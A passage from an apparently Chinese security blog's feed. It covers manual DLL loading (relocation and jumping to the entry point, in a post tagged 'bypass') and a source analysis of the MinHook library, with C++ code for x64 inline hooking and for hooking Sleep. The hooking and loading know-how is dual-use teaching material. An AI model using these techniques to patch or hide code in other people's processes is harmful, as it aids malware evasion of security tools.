class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_REL_BASED_LOW                   2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_REL_BASED_HIGHLOW               3</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_REL_BASED_HIGHADJ               4</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_REL_BASED_MACHINE_SPECIFIC_5    5</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_REL_BASED_RESERVED              6</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_REL_BASED_MACHINE_SPECIFIC_7    7</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_REL_BASED_MACHINE_SPECIFIC_8    8</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_REL_BASED_MACHINE_SPECIFIC_9    9</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_REL_BASED_DIR64                 10</span></span><br></pre></td></tr></table></figure><p>在NT头的可选头(OptionalHeader)中有<code>ImageBase</code>，他是dll加载到内存中的第一个字节的首选地址。那么所有待重定位的数据都是根据这个值相对偏移，比如<code>ImageBase=0x1000</code>，现在有个数据默认是在<code>ImageBase</code>偏移的<code>0x10</code>，即理想中的<code>0x1010</code>的位置，文件中的记录就是<code>0x1010</code>；但是现在<code>ImageBase</code>变为了<code>0x2000</code>，那么重定位的位置就是<code>0x2010</code>，由此得到公式：<code>newData = oldData-ImageBase+newMemoryAddress</code>。</p><p><strong>重定位的方式</strong>就是在原来的<code>VirtualAddress</code>+<code>IMAGE_RELOC.offset</code>地址中的值加上<code>memBase-ImageBase</code></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/20250227151816169.png" alt="image-20250105175336157" /></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/20250227151820285.png" alt="image-20250105173759085" /></p></li><li><p>获得PE文件中<code>AddressOfEntryPoint</code>完成映射后的地址，然后跳转执行。这几乎是最简单的一步了，直接在NT头的可选头(OptionalHeader)中的<code>AddressOfEntryPoint</code>可以得到，这也是PE文件格式分析中强调过的，就是得算一下偏移；最后刷新指令集缓存（可以忽略，但是会增大dll调用失败概率），跳转到程序入口点<code>AddressOfEntryPoint</code>执行（DLL的就为<code>DllMain</code>了）</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/20250227151824472.png" alt="image-20250105183441641" /></p></li></ol>]]></content>
    
    
    <summary type="html">&lt;p&gt;公众号：&lt;a href=&quot;https://mp.weixin.qq.com/s/M92n3e-yCG64ry9GLt5A3A&quot;&gt;https://mp.weixin.qq.com/s/M92n3e-yCG64ry9GLt5A3A&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="notes" scheme="https://joe1sn.eu.org/categories/notes/"/>
    
    
    <category term="bypass" scheme="https://joe1sn.eu.org/tags/bypass/"/>
    
  </entry>
  
  <entry>
    <title>【源码分析】MinHook源代码分析</title>
    <link href="https://joe1sn.eu.org/2024/07/24/minhook-source/"/>
    <id>https://joe1sn.eu.org/2024/07/24/minhook-source/</id>
    <published>2024-07-24T07:44:48.000Z</published>
    <updated>2025-01-26T14:46:00.784Z</updated>
    
    <content type="html"><![CDATA[<p>世界上果然没有魔法，到最后发现都是魔术</p><p>解读的项目地址：<a href="https://github.com/TsudaKageyu/minhook">https://github.com/TsudaKageyu/minhook</a></p><p>公众号：<a href="https://mp.weixin.qq.com/s/Po_t-JGj0e3dMBKDd9i8cw">https://mp.weixin.qq.com/s/Po_t-JGj0e3dMBKDd9i8cw</a></p><span id="more"></span><p>或许我们的公众号会有更多你感兴趣的内容</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/a0d42261f5e0b243c214f5af9049fc29.jpg" alt="img" /></p><h1 id="p1-hook原理"><a class="markdownIt-Anchor" href="#p1-hook原理"></a> P1. Hook原理</h1><p>首先使用Visual Studio中的MSVC编译器，按照Release x64 禁用代码优化 编译如下代码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">hello</span><span class="params">()</span> </span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;123\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="built_in">hello</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们在<code>main</code>函数中的<code>hello()</code>处加上断点（ps:为什么选择了release版本任然能够调试：1.没有antiDebug。2.调式符号依然保存了。3.代码量小,就算开了代码优化也不会有较大影响）</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/96d7730a2e1dc806a77fc5ef76f72aab.png" alt="image-20240724155339931" /></p><p>步入<code>call</code>汇编</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/1566587521dcc11bbb6d5d9126c8e574.png" alt="image-20240724155353773" /></p><p>这里就是目前编译情况下的<code>hello</code>函数的汇编实现了。</p><p><strong>那么我们就可以找到<code>hello</code>函数的地址，然后覆盖他的汇编，让执行流转移到我们创建的新的函数</strong>。所以我们继续写有如下代码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">hello</span><span class="params">()</span> </span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;123\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">newhello</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;This is New hello\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> jmpopcode[<span class="number">14</span>] = &#123;</span><br><span class="line">        <span class="number">0x68</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC7</span>, <span class="number">0x44</span>, <span class="number">0x24</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,<span class="number">0x00</span>, <span class="number">0xC3</span></span><br><span class="line">    &#125;;</span><br><span class="line">    DWORD64 oldFuncAddr = <span class="built_in">reinterpret_cast</span>&lt;DWORD64&gt;(hello);</span><br><span class="line">    DWORD64 newFuncAddr = <span class="built_in">reinterpret_cast</span>&lt;DWORD64&gt;(newhello);</span><br><span class="line">    </span><br><span class="line">    DWORD old;</span><br><span class="line">    <span class="built_in">VirtualProtect</span>(hello, <span class="number">15</span>, PAGE_EXECUTE_READWRITE, &amp;old);</span><br><span class="line">    *(DWORD32*)(jmpopcode + <span class="number">1</span>) = (DWORD32)newFuncAddr;</span><br><span class="line">    *(DWORD32*)(jmpopcode + <span class="number">9</span>) = (DWORD32)(newFuncAddr &gt;&gt; <span class="number">32</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(hello, jmpopcode, <span class="number">14</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">hello</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>依然是调用<code>hello()</code>的使用跟进去</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/c904ce64aeb9d288cf86bd7e1a672f1d.png" alt="image-20240724161051582" /></p><p>执行到<code>00007FF7FED8100D</code>，会跳转到我们的函数<code>newhello()</code></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/2716149fcfd3d091c904996de6c2937e.png" alt="image-20240724161136732" /></p><p>这样我们就完成了一次hook，<strong>后续无论调用多少次<code>hello</code>函数，都会执行为<code>newhello</code>函数</strong></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/1a23c14c14305eb30094c0f4de354783.png" alt="image-20240724161944509" /></p><p>关于我们这里的代码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> jmpopcode[<span class="number">14</span>] = &#123;</span><br><span class="line">        <span class="number">0x68</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC7</span>, <span class="number">0x44</span>, <span class="number">0x24</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,<span class="number">0x00</span>, <span class="number">0xC3</span></span><br><span class="line">    &#125;;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    *(DWORD32*)(jmpopcode + <span class="number">1</span>) = (DWORD32)newFuncAddr;</span><br><span class="line">    *(DWORD32*)(jmpopcode + <span class="number">9</span>) = (DWORD32)(newFuncAddr &gt;&gt; <span class="number">32</span>);</span><br></pre></td></tr></table></figure><p><code>jmpopcode</code>实际上是这样一段汇编代码，假如我们要跳转到<code>0x 20000000 10000000</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">push 0x10000000</span><br><span class="line">mov dword [rsp+4], 0x20000000</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>这是在64位下一种特殊的跳转代码，由于<code>jmp</code>指令的限制，只能2GB内内存寻址，到了x64寻址空间大大加大，单纯<code>jmp</code>和<code>call</code>已经无法跳转到地址，所以我们将带跳转的地址依次将低位、高位移动到栈顶（rsp），这样ret就能直接跳转了，这种好处就是不会污染栈和寄存器。</p><p>如果在x86（32位）的情况下，直接使用<code>jmp</code>跳转即可</p><p>总结一下hook的步骤就是：</p><ol><li>找到待hook函数的地址</li><li>覆盖待hook函数汇编码，让待hook函数跳转到新的函数</li><li>取消hook恢复待hook函数的汇编码即可</li></ol><h1 id="p2-使用minhook"><a class="markdownIt-Anchor" href="#p2-使用minhook"></a> P2. 使用MinHook</h1><p>在项目文件夹中，然后再vs中包含</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/TsudaKageyu/minhook</span><br></pre></td></tr></table></figure><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/b6609ede11395995cdce61b89e6f495c.png" alt="image-20240724163342822" /></p><p>现在我们使用MinHook来实现P1中的功能</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;minhook/MinHook.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">hello</span><span class="params">()</span> </span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;123\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">newhello</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;This is New hello\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">LPVOID *lpOldHello = <span class="literal">nullptr</span>;</span><br><span class="line"><span class="built_in">MH_Initialize</span>();</span><br><span class="line"><span class="built_in">MH_CreateHook</span>(hello, newhello, lpOldHello);</span><br><span class="line"><span class="built_in">MH_EnableHook</span>(hello);</span><br><span class="line"><span class="built_in">hello</span>();</span><br><span class="line"><span class="built_in">MH_DisableHook</span>(hello);</span><br><span class="line"><span class="built_in">hello</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/6951a9d4f37ad22436021d7bdcf891e8.png" alt="image-20240724163902834" /></p><p>尝试Hook系统函数Sleep</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;minhook/MinHook.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义指向原始 Sleep 函数的指针类型</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(WINAPI* Sleep_t)</span><span class="params">(DWORD)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义指向原始 Sleep 函数的指针</span></span><br><span class="line">Sleep_t fpSleep = <span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 自定义的 MySleep 函数</span></span><br><span class="line"><span class="comment">//  参数要保持一致</span></span><br><span class="line"><span class="function"><span class="type">void</span> WINAPI <span class="title">MySleep</span><span class="params">(DWORD dwMilliseconds)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;MySleep called with &quot;</span> &lt;&lt; dwMilliseconds &lt;&lt; <span class="string">&quot; milliseconds&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用原始的 Sleep 函数</span></span><br><span class="line">    <span class="built_in">fpSleep</span>(dwMilliseconds);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">MH_Initialize</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建一个 Hook</span></span><br><span class="line">    <span class="built_in">MH_CreateHook</span>(Sleep, MySleep, <span class="built_in">reinterpret_cast</span>&lt;LPVOID*&gt;(&amp;fpSleep));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 启用 Hook</span></span><br><span class="line">    <span class="built_in">MH_EnableHook</span>(MH_ALL_HOOKS);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">Sleep</span>(<span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 清理 Hook</span></span><br><span class="line">    <span class="built_in">MH_DisableHook</span>(MH_ALL_HOOKS);</span><br><span class="line">    <span class="built_in">MH_Uninitialize</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">Sleep</span>(<span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/62a3d636d7429cff5a7016be028cbcdb.png" alt="image-20240724165152787" /></p><h1 id="p3-代码解读"><a class="markdownIt-Anchor" href="#p3-代码解读"></a> P3. 代码解读</h1><p>这里按照Hook Sleep函数的顺序</p><h2 id="mh_initialize"><a class="markdownIt-Anchor" href="#mh_initialize"></a> MH_Initialize</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">MH_STATUS WINAPI <span class="title">MH_Initialize</span><span class="params">(VOID)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    MH_STATUS status = MH_OK;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">EnterSpinLock</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (g_hHeap == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        g_hHeap = <span class="built_in">HeapCreate</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (g_hHeap != <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// Initialize the internal function buffer.</span></span><br><span class="line">            <span class="built_in">InitializeBuffer</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            status = MH_ERROR_MEMORY_ALLOC;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        status = MH_ERROR_ALREADY_INITIALIZED;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">LeaveSpinLock</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>EnterSpinLock：进入自旋锁，避免在多线程的hook中冲突。对应的是LeaveSpinLock</li><li>InitializeBuffer：无意义函数</li><li>g_hHeap：用于管理g_hooks的句柄，从之前的代码就可以看出来MinHook对于已经hook的函数的取消hook等等的管理一定是有一个全局变量在管理</li></ul><h2 id="mh_createhook"><a class="markdownIt-Anchor" href="#mh_createhook"></a> MH_CreateHook</h2><p>首先是函数的原型</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">MH_STATUS WINAPI <span class="title">MH_CreateHook</span><span class="params">(LPVOID pTarget, LPVOID pDetour, LPVOID *ppOriginal)</span></span></span><br></pre></td></tr></table></figure><ul><li>pTarget：待hook的函数（旧函数）</li><li>pDetour：新的函数</li><li>ppOriginal：指向旧函数的指针</li></ul><p>然后检查旧函数和新韩淑的可执行权限，这里又学到一个新的winapi <code>VirtualQuery</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//        if (IsExecutableAddress(pTarget) &amp;&amp; IsExecutableAddress(pDetour))</span></span><br><span class="line"><span class="function">BOOL <span class="title">IsExecutableAddress</span><span class="params">(LPVOID pAddress)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    MEMORY_BASIC_INFORMATION mi;</span><br><span class="line">    <span class="built_in">VirtualQuery</span>(pAddress, &amp;mi, <span class="built_in">sizeof</span>(mi));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (mi.State == MEM_COMMIT &amp;&amp; (mi.Protect &amp; PAGE_EXECUTE_FLAGS));</span><br><span class="line">&#125;            </span><br></pre></td></tr></table></figure><p>关于<code>VirtualQuery</code>函数：<a href="https://learn.microsoft.com/zh-cn/windows/win32/api/memoryapi/nf-memoryapi-virtualquery">https://learn.microsoft.com/zh-cn/windows/win32/api/memoryapi/nf-memoryapi-virtualquery</a></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">////////   MH_CreateHook</span></span><br><span class="line">UINT pos = <span class="built_in">FindHookEntry</span>(pTarget);</span><br><span class="line">            <span class="keyword">if</span> (pos == INVALID_HOOK_POS)</span><br><span class="line">                    </span><br><span class="line"><span class="comment">////////FindHookEntry</span></span><br><span class="line"><span class="function"><span class="type">static</span> UINT <span class="title">FindHookEntry</span><span class="params">(LPVOID pTarget)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    UINT i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; g_hooks.size; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ((ULONG_PTR)pTarget == (ULONG_PTR)g_hooks.pItems[i].pTarget)</span><br><span class="line">            <span class="keyword">return</span> i;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> INVALID_HOOK_POS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里开始就有些复杂了，上来就是两个结构体，不过不用担心，因为<code>FindHookEntry</code>中的<code>g_hooks</code>就没有初始化过，所以只能返回错误：<code>INVALID_HOOK_POS</code>，这样就进入了if里面</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">////////   MH_CreateHook</span></span><br><span class="line">LPVOID pBuffer = <span class="built_in">AllocateBuffer</span>(pTarget);</span><br><span class="line">                <span class="keyword">if</span> (pBuffer != <span class="literal">NULL</span>)</span><br><span class="line">                &#123;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">////////   AllocateBuffer</span></span><br><span class="line"><span class="function">LPVOID <span class="title">AllocateBuffer</span><span class="params">(LPVOID pOrigin)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    PMEMORY_SLOT  pSlot;</span><br><span class="line">    PMEMORY_BLOCK pBlock = <span class="built_in">GetMemoryBlock</span>(pOrigin);</span><br><span class="line">    <span class="keyword">if</span> (pBlock == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Remove an unused slot from the list.</span></span><br><span class="line">    pSlot = pBlock-&gt;pFree;</span><br><span class="line">    pBlock-&gt;pFree = pSlot-&gt;pNext;</span><br><span class="line">    pBlock-&gt;usedCount++;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _DEBUG</span></span><br><span class="line">    <span class="comment">// Fill the slot with INT3 for debugging.</span></span><br><span class="line">    <span class="built_in">memset</span>(pSlot, <span class="number">0xCC</span>, <span class="built_in">sizeof</span>(MEMORY_SLOT));</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="keyword">return</span> pSlot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">///////GetMemoryBlock 节选</span></span><br><span class="line"><span class="function"><span class="type">static</span> PMEMORY_BLOCK <span class="title">GetMemoryBlock</span><span class="params">(LPVOID pOrigin)</span></span></span><br><span class="line"><span class="function">    <span class="comment">/*....*/</span></span></span><br><span class="line"><span class="function"><span class="meta">#<span class="keyword">if</span> defined(_M_X64) || defined(__x86_64__)</span></span></span><br><span class="line"><span class="function">    SYSTEM_INFO si</span>;</span><br><span class="line">    <span class="built_in">GetSystemInfo</span>(&amp;si);</span><br><span class="line">    minAddr = (ULONG_PTR)si.lpMinimumApplicationAddress;</span><br><span class="line">    maxAddr = (ULONG_PTR)si.lpMaximumApplicationAddress;</span><br><span class="line">    <span class="comment">/*....*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Look the registered blocks for a reachable one.</span></span><br><span class="line">    <span class="keyword">for</span> (pBlock = g_pMemoryBlocks; pBlock != <span class="literal">NULL</span>; pBlock = pBlock-&gt;pNext)</span><br><span class="line">    &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(_M_X64) || defined(__x86_64__)</span></span><br><span class="line">        <span class="comment">// Ignore the blocks too far.</span></span><br><span class="line">        <span class="keyword">if</span> ((ULONG_PTR)pBlock &lt; minAddr || (ULONG_PTR)pBlock &gt;= maxAddr)</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">        <span class="comment">// The block has at least one unused slot.</span></span><br><span class="line">        <span class="keyword">if</span> (pBlock-&gt;pFree != <span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> pBlock;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*...*/</span></span><br></pre></td></tr></table></figure><ul><li><p><code>GetSystemInfo</code>：<a href="https://learn.microsoft.com/zh-cn/windows/win32/api/sysinfoapi/nf-sysinfoapi-getsysteminfo">https://learn.microsoft.com/zh-cn/windows/win32/api/sysinfoapi/nf-sysinfoapi-getsysteminfo</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lpMinimumApplicationAddress</span><br></pre></td></tr></table></figure><p>指向应用程序和动态链接库可访问的最低内存地址的指针， (DLL) 。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 